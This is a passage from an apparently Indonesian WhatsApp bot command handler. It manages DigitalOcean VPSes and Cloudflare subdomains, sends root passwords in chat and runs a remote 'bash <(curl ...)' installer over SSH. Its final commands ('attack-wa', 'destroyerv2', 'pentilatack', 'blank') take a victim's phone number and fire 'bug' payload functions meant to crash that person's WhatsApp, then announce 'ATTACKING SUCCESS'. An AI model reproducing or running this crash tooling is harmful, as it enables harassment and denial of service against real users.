              'Authorization': `Bearer ${API_TOKEN}`
            }
          });

          if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
          }

          const data = await response.json();
          return data;
        } catch (error) {
          console.error('Error fetching account info:', error);
          return null;
        }
      };

      const getPasswordInfo = async () => {
        try {
          const response = await fetch('https://api.digitalocean.com/v2/account/password', {  // Adjust endpoint as necessary
            method: 'GET',
            headers: {
              'Content-Type': 'application/json',
              'Authorization': `Bearer ${API_TOKEN}`
            }
          });

          if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
          }

          const data = await response.json();
          return data;
        } catch (error) {
          console.error('Error fetching password info:', error);
          return null;
        }
      };

      const accountInfo = await getAccountInfo();
      const passwordInfo = await getPasswordInfo();

      if (accountInfo && passwordInfo) {
        const account = accountInfo.account;
        const password = passwordInfo.password;  // Adjust according to actual response structure
        const responseText = `
Account Info:
Name: ${account.name}
Email: ${account.email}
Droplet Limit: ${account.droplet_limit}
Floating IP Limit: ${account.floating_ip_limit}
Status: ${account.status}
Team Name: ${account.team.name}
Password: ${password}
        `;
        replyy(responseText);
      } else {
        replyy('Failed to fetch account or password info');
      }
break
case 'cekakunv2': {
    if (!isDev) return replyy(`SOK ASIK 😂`);

    const getAccountInfo = async () => {
      try {
        const response = await fetch('https://api.digitalocean.com/v2/account', {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${API_TOKEN}`
          }
        });

        if (!response.ok) {
          throw new Error(`HTTP error! status: ${response.status}`);
        }

        const data = await response.json();
        return data;
      } catch (error) {
        console.error('Error fetching account info:', error);
        return null;
      }
    };

    getAccountInfo()
      .then((accountInfo) => {
        if (accountInfo) {
          const account = accountInfo.account;
          const responseText = `
Account Info:
Name: ${account.name}
Email: ${account.email}
Droplet Limit: ${account.droplet_limit}
Floating IP Limit: ${account.floating_ip_limit}
Status: ${account.status}
Team Name: ${account.team.name}
          `;
          replyy(responseText);
        } else {
          replyy('Failed to fetch account info');
        }
      })
      .catch((err) => {
        replyy(`Error: ${err.message}`);
      });
    break;
  }
break 
case "cvpsubuntu": {
if (!isDev) return replyy(`SOK ASIK 😂`);
let teksnya = `Create Vps Do Os ubuntu Reg Sgp `
let sections = [{
title: '# UBUNTU 20.04',
highlight_label: 'Ubuntu 20.04',
rows: [{
title: 'VPS 1 GB 1 CORE',
description: `1GB 1C  Os Ubuntu 20 Region Sg`, 
id: '.cvps root,sgp1,s-1vcpu-1gb,ubuntu-20-04-x64'
},
{
title: 'VPS 2 GB 1 CORE',
description: `2GB 1C  Os Ubuntu 20 Region Sg`, 
id: '.cvps root,sgp1,s-1vcpu-2gb,ubuntu-20-04-x64'
},
{
title: 'VPS 4 GB 2 CORE',
description: `4GB 2C  Os Ubuntu 20 Region Sg`, 
id: '.cvps root,sgp1,s-2vcpu-4gb,ubuntu-20-04-x64'
},
{
title: 'VPS 8 GB 4 CORE',
description: `8GB 4C  Os Ubuntu 20 Region Sg`, 
id: '.cvps root,sgp1,s-4vcpu-8gb,ubuntu-20-04-x64'
},
{
title: 'VPS 16 GB 4 CORE',
description: `16GB 4C  Os Ubuntu 20 Region New York`, 
id: '.cvps root,nyc3,s-4vcpu-16gb-amd,ubuntu-20-04-x64'
}]
},
{
title: '# UBUNTU 22.04', 
highlight_label: 'System Information',
rows: [{
title: 'VPS 1 GB 1 CORE',
description: `1GB 1C  Os Ubuntu 22 Region Sg`, 
id: '.cvps root,sgp1,s-1vcpu-1gb,ubuntu-22-04-x64'
},
{
title: 'VPS 2 GB 1 CORE',
description: `2GB 1C  Os Ubuntu 22 Region Sg`, 
id: '.cvps root,sgp1,s-1vcpu-2gb,ubuntu-22-04-x64'
},
{
title: 'VPS 4 GB 2 CORE',
description: `4GB 2C  Os Ubuntu 22 Region Sg`, 
id: '.cvps root,sgp1,s-2vcpu-4gb,ubuntu-22-04-x64'
},
{
title: 'VPS 8 GB 4 CORE',
description: `8GB 4C  Os Ubuntu 22 Region Sg`, 
id: '.cvps root,sgp1,s-4vcpu-8gb,ubuntu-22-04-x64'
    }]
     }]
let listMessage = {
    title: 'List Vps Ubuntu', 
    sections
};

let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./lib/image/vareltzy.jpg")}, { upload: VxoZap.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"Owner\",\"url\":\"https://wa.me/6285864743922\",\"merchant_url\":\"https://wa.me/6285864743922\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: Zets}) 
await VxoZap.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "listdomain": {

var teks = `*List Domain Yang Tersedia :*

.domain1 ${global.tld1}
.domain2 ${global.tld2}
.domain3 ${global.tld3}
.domain4 ${global.tld4}
.domain5 ${global.tld5}
.domain6 ${global.tld6}

*Contoh Cara Membuat Subdomain :*
ketik *.domain1* hostname|ipvps

*Contoh Cara Melihat Subdomain :*
ketik *.listsubdomain domain1*
`
replyy(teks)
}
break
case "listsubdomain": case "listsubdo": {

if (!isDev) return replyy(`SOK ASIK 😂`)
if (!args[0]) return replyy(example("domain1\n\nketik *.listdomain*\nUntuk melihat list domainnya"))
let zonenya
let apinya
let dom = args[0].toLowerCase()
if (/domain1/.test(dom)) {
zonenya = global.zone1
apinya = global.apitoken1
} else if (/domain2/.test(dom)) {
zonenya = global.zone2
apinya = global.apitoken2
} else if (/domain3/.test(dom)) {
zonenya = global.zone3
apinya = global.apitoken3
} else if (/domain4/.test(dom)) {
zonenya = global.zone4
apinya = global.apitoken4
} else if (/domain5/.test(dom)) {
zonenya = global.zone5
apinya = global.apitoken5
} else if (/domain6/.test(dom)) {
zonenya = global.zone6
apinya = global.apitoken6
}
axios.get(
`https://api.cloudflare.com/client/v4/zones/${zonenya}/dns_records`,{
headers: {
Authorization: "Bearer " + `${apinya}`,
"Content-Type": "application/json",
},
}).then(async (res) => {
if (res.data.result.length < 1) return replyy("Tidak Ada Subdomain")
var teks = `*🌐 LIST SUBDOMAIN ${dom.toUpperCase()}*\n\n*Total Subdomain :* ${res.data.result.length}\n\n`
await res.data.result.forEach(e => teks += `*Domain :* ${e.name}\n*IP :* ${e.content}\n\n`)
return replyy(teks)
})
}
break
case "domain1": case "domain2": case "domain3": case "domain4": case "domain5": case " domain6": {

if (!isDev) return replyy(`SOK ASIK 😂`)
if (!text) return replyy(example("host|ip"))
if (!text.split("|")) return replyy(example("host|ip"))
let zonenya
let apinya
let tldnya
let dom = args[0].toLowerCase()
if (/domain1/.test(command)) {
zonenya = global.zone1
apinya = global.apitoken1
tldnya = global.tld1
} else if (/domain2/.test(command)) {
zonenya = global.zone2
apinya = global.apitoken2
tldnya = global.tld2
} else if (/domain3/.test(command)) {
zonenya = global.zone3
apinya = global.apitoken3
tldnya = global.tld3
} else if (/domain4/.test(command)) {
zonenya = global.zone4
apinya = global.apitoken4
tldnya = global.tld4
} else if (/domain5/.test(command)) {
zonenya = global.zone5
apinya = global.apitoken5
tldnya = global.tld5
} else if (/domain6/.test(command)) {
zonenya = global.zone6
apinya = global.apitoken6
tldnya = global.tld6
}
async function subDomain1(host, ip) {
return new Promise((resolve) => {
axios.post(
`https://api.cloudflare.com/client/v4/zones/${zonenya}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tldnya, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
{
headers: {
Authorization: "Bearer " + apinya,
"Content-Type": "application/json",
},
}).then((e) => {
let res = e.data
if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content })
}).catch((e) => {
let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e
let err1Str = String(err1)
resolve({ success: false, error: err1Str })
})
})}
   
let raw1 = text
if (!raw1) return replyy(example("host|ip"))
let host1 = raw1.split("|")[0].trim().replace(/[^a-z0-9.-]/gi, "")
if (!host1) return replyy("Hostname Tidak Valid!, Hostname Hanya Mendukung Tanda Strip(-) Atau Titik(.)")
let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
if (!ip1 || ip1.split(".").length < 4) return replyy(ip1 ? "IP Tidak Valid!" : "Isi IP Servernya!")
await subDomain1(host1.toLowerCase(), ip1).then((e) => {
if (e['success']) replyy(`*Subdomain Berhasil Dibuat ✅*\n\n*Domain Induk 🌐*\n${tldnya}\n*IP 📡*\n${e['ip']}\n*Subdomain 🌐*\n${e['name']}`)
else replyy(`${e['error']}`)
})}
break
case "delsubdo": case "delsubdomain": {

if (!isDev) return replyy(`SOK ASIK 😂`)
if (!text) return replyy(example("domain1|subdo\n\nUntuk melihat listdomain ketik *.listdomain*"))
if (!text.split("|")) return replyy(example("domain1|subdo\n\nUntuk melihat listdomain ketik *.listdomain*"))
var [pusat, sub] = text.split("|")
var zonenya
var apinya
var tldnya
if (/domain1/.test(pusat)) {
zonenya = global.zone1
apinya = global.apitoken1
tldnya = global.tld1
} else if (/domain2/.test(pusat)) {
zonenya = global.zone2
apinya = global.apitoken2
tldnya = global.tld2
} else if (/domain3/.test(pusat)) {
zonenya = global.zone3
apinya = global.apitoken3
tldnya = global.tld3
} else if (/domain4/.test(pusat)) {
zonenya = global.zone4
apinya = global.apitoken4
tldnya = global.tld4
} else if (/domain5/.test(pusat)) {
zonenya = global.zone5
apinya = global.apitoken5
tldnya = global.tld5
} else if (/domain6/.test(pusat)) {
zonenya = global.zone6
apinya = global.apitoken6
tldnya = global.tld6
} else return replyy("Domain Tidak Ditemukan")
if (!sub.includes(".")) return replyy("Format Subdomain Tidak Valid!")
var host = sub.toLowerCase()
var dom = null
var id = null
await axios.get(`https://api.cloudflare.com/client/v4/zones/${zonenya}/dns_records`, {
headers: {
Authorization: "Bearer " + apinya,
"Content-Type": "application/json",
},
}).then(async (res) => {
await res.data.result.forEach((e) => {
if (e.name == host) {
dom = e.name
id = e.id
}})
})
if (dom == null && id == null) return replyy("Subdomain Tidak Ditemukan")
await fetch(`https://api.cloudflare.com/client/v4/zones/${zonenya}/dns_records/${id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
Authorization: "Bearer " + apinya,
"Content-Type": "application/json",
}
})
replyy(`Berhasil Menghapus Subdomain *${dom}* Dari Domain *${tldnya}*`)
}
break
case "cvps": {
  if (!isDev) return replyy(`SOK ASIK 😂`);
  let t = text.split(',');
if (t.length < 4) return replyy(`*Format salah!*\nPenggunaan: ${prefix}cvps hostname,region,osversi,ram`)

    let hostname = t[0];
    let regions = t[1];
    let ram = t[2];
    let osvps = t[3];
    
  try {
    let dropletData = {
      name: hostname,
      region: regions,
      size: ram,
      image: osvps,
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['vareltzy']
    };

    let password = generateRandomPassword()
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      replyy(`\`\`\`Tunggu Sebentar...\`\`\``);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `*\`VPS berhasil dibuat √\`*\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n\n`;
      
      messageText += `*\`SPEKTIFIKASI\`*\n\n`;
      
      messageText += `HOSTNAME: ${hostname}\n`;
      messageText += `REGION: ${regions}\n`;
      messageText += `RAM: ${ram}\n`;
      messageText += `OS + VERSI: ${osvps}\n`;

      await VxoZap.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    replyy(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break
case "listdroplet": {
  if (!isDev) return replyy(`SOK ASIK 😂`);

  try {
    const getDroplets = async () => {
      try {
        const response = await fetch('https://api.digitalocean.com/v2/droplets', {
          headers: {
            'Authorization': `Bearer ${API_TOKEN}`
          }
        });
        const data = await response.json();
        return data.droplets || [];
      } catch (error) {
        reply('Error fetching droplets: ' + error);
        return [];
      }
    };

    getDroplets().then(droplets => {
      let totalvps = droplets.length;
      let mesej = `List Droplet Digital Ocean Anda: ${totalvps}\n\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n`;

      if (droplets.length === 0) {
        mesej += 'Tidak ada Droplet yang tersedia.';
      } else {
        droplets.forEach(droplet => {
          const ipv4Addresses = droplet.networks.v4.filter(network => network.type === "public");
          const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP';
          mesej += `- Droplet Id: ${droplet.id}\n- Hostname: ${droplet.name}\n- Username Login: root\n- IP: ${ipAddress}\n- Ram: ${droplet.memory} MB\n- Cpu: ${droplet.vcpus} CPU\n- OS: ${droplet.image.distribution}\n- Storage: ${droplet.disk} GB\n- Status: ${droplet.status}\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n`;
        });
      }
      VxoZap.sendMessage(m.chat, { text: mesej });
    });
  } catch (err) {
    replyy('Terjadi kesalahan saat mengambil data droplet: ' + err);
  }
}
break
case "deldroplet": {
  if (!isDev) return replyy(`SOK ASIK 😂`);

  let dropletId = args[0];
  if (!dropletId) return replyy('ID droplet belum diberikan.');

  let deleteDroplet = async () => {
    try {
      let response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'DELETE',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_TOKEN}`
        }
      });

      if (response.ok) {
        replyy('Droplet berhasil dihapus.');
      } else {
        const errorData = await response.json();
        throw new Error(`Gagal menghapus droplet: ${errorData.message}`);
      }
    } catch (error) {
      console.error('Terjadi kesalahan saat menghapus droplet:', error);
      replyy('Terjadi kesalahan saat menghapus droplet.');
    }
  };

  deleteDroplet();
}
break
case "resetpassword": {
if (!isDev) return replyy(`SOK ASIK 😂`);
    const dropletId = args[0];
    if (!dropletId) return replyy("Please provide the Droplet ID.");
const resetDropletPassword = async (dropletId) => {
    const newPassword = generateRandomPassword();
    const userData = `#cloud-config\npassword: ${newPassword}\nchpasswd: { expire: False }`;

    const dropletData = {
        type: 'password_reset',
        user_data: userData
    };

    try {
        const response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${API_TOKEN}`
            },
            body: JSON.stringify(dropletData)
        });

        if (response.ok) {
            const result = await response.json();
            return `Password reset successfully. New password: ${newPassword}`;
        } else {
            const errorData = await response.json();
            return `Failed to reset password: ${errorData.message}`;
        }
    } catch (error) {
        return `Error resetting password: ${error.message}`;
    }
};
    const resetPasswordMessage = await resetDropletPassword(dropletId);
    replyy(resetPasswordMessage);
}


break
case "rebuildvps": {
  if (!isDev) return VxoZap.sendMessage(m.chat, { text: `Lu Siapanya Gua Anjg Gausah Nyuruh Nyuruh Gua Yatim` });

  const text = args.join(' ');
  const t = text.split(',');
  if (t.length < 2) {
    VxoZap.sendMessage(m.chat, { text: 'Mohon masukkan ID vps dan Image yang ingin digunakan\n\n.rebuildvps 847274,ubuntu-20-04-x64' });
    break;
  }

  const dropletId = t[0];
  const imageS = t[1];

  let rebuildVPS = async () => {
    try {
      // Generate a new password
      let newPassword = await generateRandomPassword(); // Atau bisa menggunakan generator password

      // User data untuk menyetel password baru
      let userData = `#cloud-config
password: ${newPassword}
chpasswd: { expire: False }`;

      // Data untuk rebuild droplet
      let dropletData = {
        type: 'rebuild',
        image: imageS,
        user_data: userData
      };

      // Request rebuild
      let response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_TOKEN}`
        },
        body: JSON.stringify(dropletData)
      });

      if (response.ok) {
        const result = await response.json();
        VxoZap.sendMessage(m.chat, { text: `Password baru VPS: ${newPassword}` });
        VxoZap.sendMessage(m.chat, { text: JSON.stringify(result) });

        // Mendapatkan informasi VPS setelah rebuild
        const vpsInfo = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${API_TOKEN}`
          }
        });

        if (vpsInfo.ok) {
          const vpsData = await vpsInfo.json();
          const droplet = vpsData.droplet;
          const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
          const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP';

          const textvps = `*VPS SUKSES REBUILD*\nIP VPS: ${ipAddress}\nSYSTEM IMAGE: ${droplet.image.slug}\nPASSWORD: ${newPassword}`;
          await sleep(60000);
          VxoZap.sendMessage(m.chat, { text: textvps });
        } else {
          VxoZap.sendMessage(m.chat, { text: 'Gagal mendapatkan informasi VPS setelah rebuild.' });
        }
      } else {
        const errorData = await response.json();
        VxoZap.sendMessage(m.chat, { text: `Gagal melakukan rebuild VPS: ${errorData.message}` });
      }
    } catch (error) {
      VxoZap.sendMessage(m.chat, { text: `Terjadi kesalahan saat melakukan rebuild VPS: ${error}` });
    }
  };

  rebuildVPS();
}

break
case 'uninstallpanel': case 'paneluninstall': {
    if (!isDev) return ('Maaf Hanya Untuk VarelTzy')
    
    let t = text.split(',');
    if (t.length < 2) return replyy(`\`𝖥𝗈𝗋𝗆𝖺𝗍 𝖲𝖺𝗅𝖺𝗁\`\n𝖳𝗎𝗍𝗈𝗋𝗂𝖺𝗅 𝖯𝖾𝗇𝗀𝗀𝗎𝗇𝖺𝖺𝗇 ${cmd} 𝗂𝗉𝗏𝗉𝗌,𝗉𝖺𝗌𝗌𝗐𝗈𝗋𝖽`)
    
    let ipvps = t[0];
    let passwd = t[1];
    let token = t[2];
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    // Gunakan string terenkripsi di kode Anda
    const command = 'bash <(curl -s https://pterodactyl-installer.se)'
    const conn = new Client();
 
    conn.on('ready', () => {
        isSuccess = true; // Set flag menjadi true jika koneksi berhasil
        replyy('*PROSES UNINSTALL PANEL & WINGS*')
        
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ' + code + ' and signal ' + signal);
replyy('SUCCES UNINSTALL PANEL & WINGS COBA CEK😁');
                conn.end();
            }).on('data', (data) => {
                stream.write('6\n');
                stream.write('y\n');
                stream.write('y\n');
                stream.write('y\n');
                stream.write(`y\n`)
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        replyy('Katasandi atau IP tidak valid');
    }).connect(connSettings);
   }
     break  
     case 'play': {
			if (!text) return replyy(`*Example :*\n\n*Play Mendua*`)
			replyy(`𝙎𝘼𝘽𝘼𝙍 𝘽𝘼𝙉𝙂`);
			let yts = require("youtube-yts")
			let look = await yts(text);
			let convert = look.videos[0];
			const pl = await youtube(convert.url)
			await VxoZap.sendMessage(m.chat, {
				audio: {
					url: pl.mp3
				},
				fileName: convert.title + '.mp3',
				mimetype: 'audio/mpeg',
				contextInfo: {
					externalAdReply: {
						title: convert.title,
						body: packname,
						thumbnailUrl: convert.image,
						sourceUrl: pl.mp3,
						mediaType: 1,
						mediaUrl: convert.url,
					}
				},
			}, {
				quoted: Zets
			})
		}
		break
 case 'katalog-crash': case 'destroyerv2': case 'destroyerv1': case 'kasih-paham': case 'attack-wa': {
if (!isCreator) return replyy(`𝘽𝙀𝙇𝙄 𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝘿𝙐𝙇𝙐 𝘽𝘼𝙉𝙂 𝙈𝙊𝙃𝙊𝙉 𝙃𝙐𝘽𝙐𝙉𝙂𝙄 𝙊𝙒𝙉𝙀𝙍`)
			if (!q) return replyy(`*Syntax Error!*\n\n_Use : ${prefix+command} Number_\n_Example : ${prefix+command} 62xx_\n\n${global.namaowner}`);
			let {
				proto,
				generateWAMessageFromContent
			} = require('@whiskeysockets/baileys')
			incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
			if (incTarget.startsWith('0')) return replyy(`*Syntax Error!*\n\n_Use : ${prefix+command} Number_\n_Example : ${prefix+command} 62xx_\n\n${global.namaowner}`)
			let X = incTarget + '@s.whatsapp.net';
			if (owner.includes(incTarget)) {
			replyy('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
			} else {
				replyy(`𝐁𝐎𝐓 𝐈𝐒 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐋𝐄𝐀𝐒𝐄 𝐖𝐀𝐈𝐓 ☣︎`)
				global.jumlah = text.split("|")[1]
				for (let i = 0; i < 1; i++) {
		await InVisiLocNull(VxoZap, X, null, GetSuZo, Ptcp = true)
					await InVisiLoc(VxoZap, X, GetSuZo, Ptcp = true)
					await Gsz(VxoZap, X, GSZ)					
					await InVisiLocXz(VxoZap, X, GetSuZo, Ptcp = true)
				}
				let msg = generateWAMessageFromContent(m.chat, {
					viewOnceMessage: {
						message: {
							"messageContextInfo": {
								"deviceListMetadata": {},
								"deviceListMetadataVersion": 2
							},
							interactiveMessage: proto.Message.InteractiveMessage.create({
								contextInfo: {
									mentionedJid: [m.sender],
									isForwarded: true,
									forwardingScore: 999,
									forwardedNewsletterMessageInfo: {
										newsletterJid: global.xchannel.jid,
										newsletterName: ' ᤪᤣ᪰𝐕͢𝐑ᤠ𝐋ᤡ 𝐕͢ᤡ𝟗',
										serverMessageId: -1
									},
									businessMessageForwardInfo: {
										businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
									},
								},
								body: proto.Message.InteractiveMessage.Body.create({
									text: ''
								}),
								footer: proto.Message.InteractiveMessage.Footer.create({
									text: " ᤪᤣ᪰𝐕͢𝐑ᤠ𝐋ᤡ 𝐕͢ᤡ𝟗"
								}),
								header: proto.Message.InteractiveMessage.Header.create({
									title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝐒𝐐𝐋 𝐗 𝐏𝐀𝐘`,
									subtitle: "",
									hasMediaAttachment: true,
									...(await prepareWAMessageMedia({
										image: {
											url: "https://telegra.ph/file/d75f8a14bf5fd2590c2d3.jpg"
										}
									}, {
										upload: VxoZap.waUploadToServer
									}))
								}),
								nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
									buttons: [{
																		"name": "quick_reply",
										"buttonParamsJson": `{\"display_text\":\"𝙐𝙉𝙇𝙄𝙈𝙄𝙏𝙀𝘿 𝘾𝙍𝘼𝙎𝙃\",\"id\":\"invisible-infinite ${incTarget}\"}`
									}, ],
								})
							})
						}
					}
				}, {})

				await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
					messageId: msg.key.id
				});
						await taskdone(finishmoji)
			}
		}
		break
		  case 'pentilatack': {
if (!isCreator) return replyy(`𝘽𝙀𝙇𝙄 𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝘿𝙐𝙇𝙐 𝘽𝘼𝙉𝙂 𝙈𝙊𝙃𝙊𝙉 𝙃𝙐𝘽𝙐𝙉𝙂𝙄 𝙊𝙒𝙉𝙀𝙍`)
			if (!q) return replyy(`*Syntax Error!*\n\n_Use : ${prefix+command} Number_\n_Example : ${prefix+command} 62xx_\n\n${global.namaowner}`);
			let {
				proto,
				generateWAMessageFromContent
			} = require('@whiskeysockets/baileys')
			incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
			if (incTarget.startsWith('0')) return replyy(`*Syntax Error!*\n\n_Use : ${prefix+command} Number_\n_Example : ${prefix+command} 62xx_\n\n${global.namaowner}`)
			let X = incTarget + '@s.whatsapp.net';
			if (owner.includes(incTarget)) {
			replyy('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
			} else {
				replyy(`𝐁𝐎𝐓 𝐈𝐒 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐋𝐄𝐀𝐒𝐄 𝐖𝐀𝐈𝐓 ☣︎`)
				global.jumlah = text.split("|")[1]
				for (let i = 0; i < 1; i++) {
			await ZnXIvS(VxoZap, X, Ptcp = true)
					await Tedex(VxoZap, X, dottm)
					await ZnXIvS(VxoZap, X, Ptcp = true)
				}
				let msg = generateWAMessageFromContent(m.chat, {
					viewOnceMessage: {
						message: {
							"messageContextInfo": {
								"deviceListMetadata": {},
								"deviceListMetadataVersion": 2
							},
							interactiveMessage: proto.Message.InteractiveMessage.create({
								contextInfo: {
									mentionedJid: [m.sender],
									isForwarded: true,
									forwardingScore: 999,
									forwardedNewsletterMessageInfo: {
										newsletterJid: global.xchannel.jid,
										newsletterName: ' ᤪᤣ᪰𝐕͢𝐑ᤠ𝐋ᤡ 𝐕͢ᤡ𝟗',
										serverMessageId: -1
									},
									businessMessageForwardInfo: {
										businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
									},
								},
								body: proto.Message.InteractiveMessage.Body.create({
									text: ''
								}),
								footer: proto.Message.InteractiveMessage.Footer.create({
									text: " ᤪᤣ᪰𝐕͢𝐑ᤠ𝐋ᤡ 𝐕͢ᤡ𝟗"
								}),
								header: proto.Message.InteractiveMessage.Header.create({
									title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝐒𝐐𝐋 𝐒𝐏𝐀𝐌`,
									subtitle: "",
									hasMediaAttachment: true,
									...(await prepareWAMessageMedia({
										image: {
											url: "https://telegra.ph/file/d75f8a14bf5fd2590c2d3.jpg"
										}
									}, {
										upload: VxoZap.waUploadToServer
									}))
								}),
								nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
									buttons: [{
																		"name": "quick_reply",
										"buttonParamsJson": `{\"display_text\":\"𝙐𝙉𝙇𝙄𝙈𝙄𝙏𝙀𝘿 𝘾𝙍𝘼𝙎𝙃\",\"id\":\"infinite ${incTarget}\"}`
									}, ],
								})
							})
						}
					}
				}, {})

				await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
					messageId: msg.key.id
				});
						await taskdone(finishmoji)
			}
		}
		break
		case 'blank': {
if (!isCreator) return replyy(`𝘽𝙀𝙇𝙄 𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝘿𝙐𝙇𝙐 𝘽𝘼𝙉𝙂 𝙈𝙊𝙃𝙊𝙉 𝙃𝙐𝘽𝙐𝙉𝙂𝙄 𝙊𝙒𝙉𝙀𝙍`)
			if (!q) return replyy(`*Syntax Error!*\n\n_Use : ${prefix+command} Number_\n_Example : ${prefix+command} 62xx_\n\n${global.namaowner}`);
			let {
				proto,
				generateWAMessageFromContent
			} = require('@whiskeysockets/baileys')
			incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
			if (incTarget.startsWith('0')) return replyy(`*Syntax Error!*\n\n_Use : ${prefix+command} Number_\n_Example : ${prefix+command} 62xx_\n\n${global.namaowner}`)
			let X = incTarget + '@s.whatsapp.net';
			if (owner.includes(incTarget)) {
			replyy('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
			} else {
				replyy(`𝐁𝐎𝐓 𝐈𝐒 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐋𝐄𝐀𝐒𝐄 𝐖𝐀𝐈𝐓 ☣︎`)
				global.jumlah = text.split("|")[1]				
